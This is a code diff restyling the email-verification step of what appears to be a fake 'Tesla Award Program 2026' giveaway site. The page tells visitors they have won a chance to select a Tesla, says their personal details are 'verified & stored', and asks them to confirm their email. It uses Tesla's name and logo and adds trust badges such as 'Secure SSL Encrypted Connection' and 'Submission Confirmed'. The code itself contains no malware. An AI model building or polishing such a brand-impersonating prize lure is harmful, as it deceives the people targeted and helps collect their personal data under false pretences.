@@ -3,26 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Your Email | Tesla Award Program 2026</title>
+  <title>Congratulations! Verify Your Entry | Tesla Award Program 2026</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/style.css">
   <style>
     :root {
-      --bg: #f8f9fa;
+      --bg: #f5f6f8;
       --surface: #ffffff;
-      --dark: #111111;
-      --text: #333333;
-      --text-secondary: #666666;
-      --text-muted: #999999;
+      --dark: #171a20;
+      --dark-muted: #393c41;
+      --gray-light: #f4f5f6;
+      --border-color: rgba(23, 26, 32, 0.08);
       --red: #E31937;
-      --red-light: rgba(227,25,55,0.06);
-      --red-border: rgba(227,25,55,0.15);
-      --border: rgba(0,0,0,0.08);
-      --radius: 12px;
-      --transition: 0.2s ease;
+      --red-light: rgba(227, 25, 55, 0.05);
+      --red-border: rgba(227, 25, 55, 0.15);
+      --green: #00A550;
+      --green-light: rgba(0, 165, 80, 0.06);
+      --radius-sm: 8px;
+      --radius-md: 16px;
+      --radius-lg: 24px;
+      --shadow-premium: 0 4px 20px rgba(0, 0, 0, 0.03), 0 12px 40px rgba(0, 0, 0, 0.05);
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
     body {
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -30,294 +38,428 @@
       color: var(--dark);
       -webkit-font-smoothing: antialiased;
       min-height: 100vh;
-    }
-
-    .page {
-      min-height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 100px 24px 80px;
     }
 
-    .card {
+    .page-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 120px 24px 80px;
+    }
+
+    .congrats-card {
       background: var(--surface);
-      border-radius: 24px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.04), 0 8px 32px rgba(0,0,0,0.06);
-      border: 1px solid var(--border);
-      padding: 56px 52px;
-      max-width: 560px;
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-premium);
+      border: 1px solid var(--border-color);
       width: 100%;
-      animation: cardIn 0.7s cubic-bezier(0.22, 0.61, 0.36, 1);
+      max-width: 920px;
+      overflow: hidden;
+      display: grid;
+      grid-template-columns: 1.1fr 1.3fr;
+      animation: cardEnter 0.8s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
-    @keyframes cardIn {
-      from { opacity: 0; transform: translateY(24px) scale(0.98); }
-      to { opacity: 1; transform: translateY(0) scale(1); }
+    @keyframes cardEnter {
+      from {
+        opacity: 0;
+        transform: translateY(30px) scale(0.98);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
     }
 
-    /* Icon */
-    .icon-wrap {
-      width: 80px;
-      height: 80px;
+    /* Left Side: Progress & Steps Tracking */
+    .congrats-sidebar {
+      background: #171a20;
+      color: #ffffff;
+      padding: 48px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+    }
+
+    .congrats-sidebar::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 10% 10%, rgba(227, 25, 55, 0.08), transparent 60%);
+      pointer-events: none;
+    }
+
+    .sidebar-header {
+      margin-bottom: 40px;
+    }
+
+    .sidebar-header h2 {
+      font-size: 14px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.15em;
+      color: rgba(255, 255, 255, 0.4);
+      margin-bottom: 8px;
+    }
+
+    .sidebar-header h3 {
+      font-size: 24px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      color: #ffffff;
+    }
+
+    .timeline {
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+      position: relative;
+    }
+
+    .timeline::after {
+      content: "";
+      position: absolute;
+      top: 14px;
+      left: 17px;
+      width: 2px;
+      height: calc(100% - 28px);
+      background: rgba(255, 255, 255, 0.12);
+      z-index: 1;
+    }
+
+    .timeline-item {
+      display: flex;
+      gap: 20px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .timeline-icon {
+      width: 36px;
+      height: 36px;
       border-radius: 50%;
-      background: linear-gradient(135deg, #E31937, #ff3c57);
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 32px;
-      box-shadow: 0 8px 28px rgba(227,25,55,0.25);
-      animation: iconPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-    }
-
-    @keyframes iconPop {
-      from { transform: scale(0); }
-      to { transform: scale(1); }
-    }
-
-    .icon-wrap svg {
-      width: 38px;
-      height: 38px;
-      animation: iconFloat 3s ease-in-out infinite;
-    }
-
-    @keyframes iconFloat {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-4px); }
-    }
-
-    /* Typography */
-    .title {
-      font-size: 28px;
-      font-weight: 800;
-      color: var(--dark);
-      text-align: center;
-      line-height: 1.25;
-      margin-bottom: 14px;
-      letter-spacing: -0.3px;
-    }
-
-    .subtitle {
-      font-size: 15px;
-      color: var(--text-secondary);
-      line-height: 1.75;
-      text-align: center;
-      margin-bottom: 36px;
-      font-weight: 400;
-    }
-
-    .subtitle strong {
-      color: var(--dark);
-      font-weight: 700;
-    }
-
-    /* Email badge */
-    .email-badge {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      background: var(--red-light);
-      border: 1px solid var(--red-border);
-      border-radius: var(--radius);
-      padding: 16px 20px;
-      margin-bottom: 32px;
-    }
-
-    .email-badge svg {
-      width: 20px;
-      height: 20px;
       flex-shrink: 0;
-      color: var(--red);
-    }
-
-    .email-badge .email-label {
-      font-size: 11px;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      font-weight: 600;
-    }
-
-    .email-badge .email-value {
       font-size: 14px;
-      color: var(--dark);
-      font-weight: 600;
-      word-break: break-all;
+      font-weight: 700;
+      transition: var(--transition);
+    }
+
+    .timeline-icon.completed {
+      background: var(--green);
+      color: #ffffff;
+      box-shadow: 0 0 16px rgba(0, 165, 80, 0.4);
+    }
+
+    .timeline-icon.active {
+      background: var(--red);
+      color: #ffffff;
+      box-shadow: 0 0 16px rgba(227, 25, 55, 0.4);
+      animation: pulseGlow 2s infinite ease-in-out;
+    }
+
+    .timeline-icon.locked {
+      background: #2b303a;
+      color: rgba(255, 255, 255, 0.4);
+      border: 1.5px solid rgba(255, 255, 255, 0.08);
+    }
+
+    @keyframes pulseGlow {
+      0%, 100% {
+        box-shadow: 0 0 12px rgba(227, 25, 55, 0.3);
+      }
+      50% {
+        box-shadow: 0 0 22px rgba(227, 25, 55, 0.6);
+      }
+    }
+
+    .timeline-content {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .timeline-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 2px;
+    }
+
+    .timeline-desc {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.5);
       line-height: 1.4;
     }
 
-    /* Steps */
-    .steps {
-      background: var(--bg);
-      border-radius: var(--radius);
-      padding: 28px 28px 20px;
-      margin-bottom: 32px;
+    .timeline-item.active .timeline-title {
+      color: #ffffff;
     }
 
-    .steps-title {
-      font-size: 12px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--text-muted);
-      margin-bottom: 20px;
+    .timeline-item.locked .timeline-title {
+      color: rgba(255, 255, 255, 0.4);
     }
 
-    .step {
-      display: flex;
-      align-items: flex-start;
-      gap: 14px;
-      padding: 12px 0;
-    }
-
-    .step + .step {
-      border-top: 1px solid var(--border);
-    }
-
-    .step-num {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      background: var(--dark);
-      color: white;
-      font-size: 13px;
-      font-weight: 700;
+    .sidebar-footer {
+      margin-top: 40px;
+      padding-top: 24px;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
       display: flex;
       align-items: center;
+      gap: 12px;
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.4);
+    }
+
+    .sidebar-footer svg {
+      width: 16px;
+      height: 16px;
+      color: var(--green);
+    }
+
+    /* Right Side: Primary Actions */
+    .congrats-main {
+      padding: 56px;
+      display: flex;
+      flex-direction: column;
       justify-content: center;
-      flex-shrink: 0;
     }
 
-    .step-content {
-      flex: 1;
-    }
-
-    .step-content p {
-      font-size: 14px;
-      color: var(--text);
-      font-weight: 500;
-      line-height: 1.5;
-    }
-
-    .step-content p strong {
-      color: var(--dark);
-      font-weight: 700;
-    }
-
-    /* Resend */
-    .resend {
-      text-align: center;
-    }
-
-    .resend-hint {
-      font-size: 13px;
-      color: var(--text-muted);
-      margin-bottom: 14px;
-      line-height: 1.5;
-    }
-
-    .resend-hint a {
-      color: var(--red);
-      text-decoration: underline;
-      text-underline-offset: 3px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    .btn-resend {
+    .success-badge {
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      background: transparent;
-      border: 1.5px solid var(--border);
-      color: var(--text-secondary);
-      font-family: 'Inter', sans-serif;
-      font-size: 14px;
-      font-weight: 600;
-      padding: 12px 28px;
-      border-radius: var(--radius);
-      cursor: pointer;
-      transition: all var(--transition);
-    }
-
-    .btn-resend:hover {
-      border-color: var(--red);
-      color: var(--red);
-      background: var(--red-light);
-    }
-
-    .btn-resend:disabled {
-      opacity: 0.45;
-      cursor: not-allowed;
-    }
-
-    .btn-resend:disabled:hover {
-      border-color: var(--border);
-      color: var(--text-secondary);
-      background: transparent;
-    }
-
-    .resend-countdown {
+      background: var(--green-light);
+      border: 1px solid rgba(0, 165, 80, 0.15);
+      color: var(--green);
       font-size: 12px;
-      color: var(--text-muted);
-      margin-top: 10px;
-      display: none;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 99px;
+      align-self: flex-start;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
     }
 
-    .btn-resend svg {
-      width: 16px;
-      height: 16px;
-    }
-
-    .divider {
-      height: 1px;
-      background: var(--border);
-      margin: 28px 0;
-    }
-
-    .security-note {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 12px;
-      color: var(--text-muted);
-    }
-
-    .security-note svg {
+    .success-badge svg {
       width: 14px;
       height: 14px;
     }
 
-    /* Responsive */
-    @media (max-width: 600px) {
-      .page {
-        padding: 80px 16px 60px;
+    .main-title {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--dark);
+      letter-spacing: -0.5px;
+      line-height: 1.2;
+      margin-bottom: 12px;
+    }
+
+    .main-desc {
+      font-size: 15px;
+      color: var(--dark-muted);
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .main-desc strong {
+      color: var(--dark);
+      font-weight: 700;
+    }
+
+    /* Email address banner */
+    .email-banner {
+      background: var(--gray-light);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 28px;
+      transition: var(--transition);
+    }
+
+    .email-banner:hover {
+      border-color: rgba(23, 26, 32, 0.15);
+    }
+
+    .email-banner-icon {
+      width: 42px;
+      height: 42px;
+      background: #ffffff;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+      color: var(--red);
+    }
+
+    .email-banner-icon svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .email-banner-info {
+      flex: 1;
+      overflow: hidden;
+    }
+
+    .email-banner-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: var(--dark-muted);
+      letter-spacing: 0.05em;
+      margin-bottom: 2px;
+    }
+
+    .email-banner-value {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--dark);
+      word-break: break-all;
+    }
+
+    /* Resend Email section */
+    .resend-section {
+      text-align: center;
+      padding: 10px 0;
+      border-top: 1px solid var(--border-color);
+      padding-top: 24px;
+    }
+
+    .resend-text {
+      font-size: 13px;
+      color: var(--dark-muted);
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
+    .btn-tesla-solid {
+      background: var(--dark);
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 14px 28px;
+      border-radius: var(--radius-sm);
+      border: none;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: var(--transition);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      width: 100%;
+    }
+
+    .btn-tesla-solid:hover:not(:disabled) {
+      background: #2b303a;
+      transform: translateY(-1px);
+    }
+
+    .btn-tesla-solid:disabled {
+      background: rgba(23, 26, 32, 0.4);
+      color: rgba(255, 255, 255, 0.7);
+      cursor: not-allowed;
+    }
+
+    .countdown-timer {
+      font-size: 12px;
+      color: var(--red);
+      font-weight: 600;
+      margin-top: 10px;
+      display: none;
+    }
+
+    /* Navigation Override */
+    .nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 64px;
+      background: #ffffff;
+      border-bottom: 1px solid var(--border-color);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+    }
+
+    .nav-inner {
+      width: 100%;
+      max-width: 1160px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+    }
+
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      color: var(--dark);
+      text-decoration: none;
+    }
+
+    .nav-logo img {
+      height: 22px;
+      width: auto;
+    }
+
+    /* Responsive Breakdown */
+    @media (max-width: 900px) {
+      .congrats-card {
+        grid-template-columns: 1fr;
+        max-width: 580px;
       }
-      .card {
-        padding: 40px 24px;
-        border-radius: 16px;
+
+      .congrats-sidebar {
+        padding: 40px;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.08);
       }
-      .title {
-        font-size: 24px;
+
+      .congrats-main {
+        padding: 40px;
       }
-      .subtitle {
+    }
+
+    @media (max-width: 500px) {
+      .page-container {
+        padding: 100px 16px 40px;
+      }
+
+      .congrats-sidebar {
+        padding: 32px 24px;
+      }
+
+      .congrats-main {
+        padding: 32px 24px;
+      }
+
+      .main-title {
+        font-size: 26px;
+      }
+
+      .main-desc {
         font-size: 14px;
-      }
-      .steps {
-        padding: 20px 18px 14px;
-      }
-      .step {
-        gap: 10px;
-      }
-      .step-num {
-        width: 24px;
-        height: 24px;
-        font-size: 11px;
-      }
-      .step-content p {
-        font-size: 13px;
       }
     }
   </style>
@@ -325,90 +467,119 @@
 </head>
 <body>
 
-<!-- Nav -->
+<!-- Navigation Bar -->
 <nav class="nav">
   <div class="nav-inner">
     <a href="index.html" class="nav-logo">
-      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle">
-      TESLA
+      <img src="assets/tesla-award-logo.png" alt="Tesla Logo">
+      <span>TESLA</span>
     </a>
   </div>
 </nav>
 
-<!-- Content -->
-<div class="page">
-  <div class="card">
-    <!-- Envelope Icon -->
-    <div class="icon-wrap">
-      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="2" y="4" width="20" height="16" rx="2"/>
-        <path d="M2 7l10 7 10-7"/>
-      </svg>
-    </div>
-
-    <h1 class="title">Check Your Inbox</h1>
-    <p class="subtitle">
-      Congratulations, <strong id="userName">there</strong>! Your entry into the Tesla Award Program has been submitted. To confirm your spot in the draw and unlock your winner dashboard, please verify your email address.
-    </p>
-
-    <!-- Email Display -->
-    <div class="email-badge">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="2" y="4" width="20" height="16" rx="2"/>
-        <polyline points="22,6 12,13 2,6"/>
-      </svg>
+<!-- Page Content -->
+<div class="page-container">
+  <div class="congrats-card">
+    
+    <!-- Left Column: Entry Progress Tracker -->
+    <div class="congrats-sidebar">
       <div>
-        <div class="email-label">Verification email sent to</div>
-        <div class="email-value" id="emailShown">your email address</div>
-      </div>
-    </div>
+        <div class="sidebar-header">
+          <h2>Award Entry</h2>
+          <h3>Status Tracker</h3>
+        </div>
 
-    <!-- Steps -->
-    <div class="steps">
-      <div class="steps-title">Next Steps</div>
-      <div class="step">
-        <div class="step-num">1</div>
-        <div class="step-content">
-          <p>Open the email from <strong>Tesla Award Program</strong> in your inbox</p>
-        </div>
-      </div>
-      <div class="step">
-        <div class="step-num">2</div>
-        <div class="step-content">
-          <p>Click the <strong>Verify My Email</strong> button inside the email</p>
-        </div>
-      </div>
-      <div class="step">
-        <div class="step-num">3</div>
-        <div class="step-content">
-          <p>You will be taken to your personal dashboard to <strong>select your Tesla</strong></p>
-        </div>
-      </div>
-    </div>
+        <div class="timeline">
+          <!-- Step 1: Confirmed -->
+          <div class="timeline-item">
+            <div class="timeline-icon completed">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;">
+                <polyline points="20 6 9 17 4 12"/>
+              </svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Entry Received</div>
+              <div class="timeline-desc">Personal details verified & stored</div>
+            </div>
+          </div>
 
-    <!-- Resend -->
-    <div class="resend">
-      <p class="resend-hint">
-        Cannot find the email? Check your spam or junk folder, or request a new verification link.
-      </p>
-      <button class="btn-resend" id="resendBtn" onclick="resendEmail()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <polyline points="23 4 23 10 17 10"/>
-          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+          <!-- Step 2: Verification Pending -->
+          <div class="timeline-item active">
+            <div class="timeline-icon active">2</div>
+            <div class="timeline-content">
+              <div class="timeline-title">Email Verification</div>
+              <div class="timeline-desc">Verify email to confirm your spot</div>
+            </div>
+          </div>
+
+          <!-- Step 3: Locked Dashboard -->
+          <div class="timeline-item locked">
+            <div class="timeline-icon locked">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px;">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Tesla Vehicle Selection</div>
+              <div class="timeline-desc">Unlock custom config & tracking</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="sidebar-footer">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
         </svg>
-        Resend Verification Email
-      </button>
-      <div class="resend-countdown" id="resendCountdown"></div>
+        <span>Secure SSL Encrypted Connection</span>
+      </div>
     </div>
 
-    <div class="divider"></div>
+    <!-- Right Column: Verification Actions -->
+    <div class="congrats-main">
+      <div class="success-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+        <span>Submission Confirmed</span>
+      </div>
 
-    <div class="security-note">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-      </svg>
-      Your information is encrypted and secure
+      <h1 class="main-title">Check Your Inbox</h1>
+      <p class="main-desc">
+        Congratulations, <strong id="userName">there</strong>! Your entry has been submitted. Please check your email to activate your profile and proceed to select your Tesla.
+      </p>
+
+      <!-- Displayed Email Badge -->
+      <div class="email-banner">
+        <div class="email-banner-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+            <polyline points="22,6 12,13 2,6"/>
+          </svg>
+        </div>
+        <div class="email-banner-info">
+          <div class="email-banner-label">Verification Sent To</div>
+          <div class="email-banner-value" id="emailShown">loading email...</div>
+        </div>
+      </div>
+
+      <!-- Resend Action -->
+      <div class="resend-section">
+        <p class="resend-text">
+          Can't find our verification email? Check your spam folder, or request a new secure verification link below.
+        </p>
+        <button class="btn-tesla-solid" id="resendBtn" onclick="resendEmail()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;display:inline-block;vertical-align:middle;margin-right:8px;">
+            <polyline points="23 4 23 10 17 10"/>
+            <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+          </svg>
+          Resend Verification Email
+        </button>
+        <div class="countdown-timer" id="resendCountdown"></div>
+      </div>
+
     </div>
   </div>
 </div>
@@ -416,47 +587,53 @@
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
 <script>
-var email = getParam('email') || '';
-var name = getParam('name') || 'there';
+  // Parse query parameters
+  var email = getParam('email') || '';
+  var name = getParam('name') || 'there';
 
-document.getElementById('userName').textContent = name;
-if (email) {
-  document.getElementById('emailShown').textContent = email;
-}
-
-var resendCooldown = 0;
-var resendTimer = null;
-
-async function resendEmail() {
-  if (!email) {
-    showToast('Email address not found. Please re-enter the program.', 'error');
-    return;
+  // Update UI with details
+  document.getElementById('userName').textContent = name;
+  if (email) {
+    document.getElementById('emailShown').textContent = email;
   }
 
-  var btn = document.getElementById('resendBtn');
-  btn.disabled = true;
+  var resendCooldown = 0;
+  var resendTimer = null;
 
-  try {
-    await apiCall('/resend', 'POST', { email: email });
-    showToast('Verification email resent. Check your inbox.', 'success');
+  async function resendEmail() {
+    if (!email) {
+      showToast('Email address not found. Please register again.', 'error');
+      return;
+    }
 
-    resendCooldown = 60;
-    var countdownEl = document.getElementById('resendCountdown');
-    countdownEl.style.display = 'block';
-    resendTimer = setInterval(function() {
-      resendCooldown--;
-      countdownEl.textContent = 'You can resend again in ' + resendCooldown + 's';
-      if (resendCooldown <= 0) {
-        clearInterval(resendTimer);
-        btn.disabled = false;
-        countdownEl.style.display = 'none';
-      }
-    }, 1000);
-  } catch (err) {
-    btn.disabled = false;
-    showToast(err.message || 'Could not resend email. Please try again.', 'error');
+    var btn = document.getElementById('resendBtn');
+    btn.disabled = true;
+
+    try {
+      showToast('Requesting new verification link...', 'info');
+      await apiCall('/resend', 'POST', { email: email });
+      showToast('Verification email resent successfully.', 'success');
+
+      // Start Countdown Cooldown
+      resendCooldown = 60;
+      var countdownEl = document.getElementById('resendCountdown');
+      countdownEl.style.display = 'block';
+      countdownEl.textContent = 'Request cooldown: ' + resendCooldown + 's remaining';
+      
+      resendTimer = setInterval(function() {
+        resendCooldown--;
+        countdownEl.textContent = 'Request cooldown: ' + resendCooldown + 's remaining';
+        if (resendCooldown <= 0) {
+          clearInterval(resendTimer);
+          btn.disabled = false;
+          countdownEl.style.display = 'none';
+        }
+      }, 1000);
+    } catch (err) {
+      btn.disabled = false;
+      showToast(err.message || 'Could not resend email. Please try again.', 'error');
+    }
   }
-}
 </script>
 </body>
 </html>
